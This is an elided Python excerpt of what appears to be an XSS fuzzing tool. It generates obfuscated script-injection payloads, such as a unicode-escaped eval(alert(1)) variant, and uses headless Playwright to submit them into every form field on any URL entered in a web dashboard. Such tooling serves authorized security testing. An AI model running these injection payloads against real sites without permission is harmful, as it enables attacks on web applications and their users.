...
def generate_mutations(entry):
    ...
    variants = [
        ...
        {"payload": f"<script>eval('\\u0061\\u006c\\u0065\\u0072\\u0074(1)')</script>", "type": "js_hackers_unicode_eval"},
...
async def detect_and_test_forms(url, payloads):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        await page.goto(url)
        ...
        for form in forms:
            ...
            for entry in payloads:
                ...
                for inp in inputs:
                    ...
                    if name:
                        context = entry["contexts"][0]
                        data[name] = mutate_payload(entry["payload"], context)
                if method == "post":
                    await page.request.post(action, data=data)
                else:
                    await page.request.get(action, params=data)
        await browser.close()
...
def dashboard():
    ...
    if request.method == 'POST':
        ...
        if url:
            ...
            asyncio.run(detect_and_test_forms(url, [m for e in base_payloads for m in generate_mutations(e)]))
